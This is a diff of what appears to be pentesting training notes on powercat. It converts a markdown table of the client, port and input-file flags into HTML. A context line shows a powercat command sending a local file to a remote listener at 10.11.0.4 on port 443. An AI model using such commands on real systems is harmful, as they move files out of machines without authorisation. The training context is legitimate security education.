@@ -26,8 +26,4 @@ PS C:\Users\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\example.txt
 ```
 {% endcode %}
 
-| Flag        | Description                                                                  |
-| ----------- | ---------------------------------------------------------------------------- |
-| `-c {IP}`   | Specifies client mode and sets the listening IP address (transfer recipient) |
-| `-p {PORT}` | Specifies the port number for connection                                     |
-| `-i {PATH}` | Indicates the local file for transfer                                        |
+<table><thead><tr><th width="158">Flag</th><th>Description</th></tr></thead><tbody><tr><td><code>-c {IP}</code></td><td>Specifies client mode and sets the listening IP address (transfer recipient)</td></tr><tr><td><code>-p {PORT}</code></td><td>Specifies the port number for connection</td></tr><tr><td><code>-i {PATH}</code></td><td>Indicates the local file for transfer</td></tr></tbody></table>
